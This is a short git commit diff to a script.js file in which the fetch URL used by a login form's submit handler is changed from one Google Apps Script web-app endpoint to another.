16568f6261314fd0154e99e7a640fa7222081ed2
mediagram1 <mediagram2013@gmail.com>
2024-08-11 19:12:16 +0530

    Update script.js

--- script.js
+++ script.js
@@ -5,7 +5,7 @@ document.getElementById('login-form').addEventListener('submit', function(event)
     const password = document.getElementById('password').value;
 
     // Make a POST request to your server
-    fetch('https://script.google.com/macros/s/AKfycbyngk3fGAisTCFgHhMfP_oNP8WYGXMvFfl_Oyp_k6nqwMllTkk-HoHXQvS7Es4U-rdzyA/exec', {
+    fetch('https://script.google.com/macros/s/AKfycbxGsuTMMZPaBQ1BGcUDc7ulRqUgFTxYIsyhBAHAlPcNVwuRaGqYM8htR9bxqy-F5BvoyA/exec', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
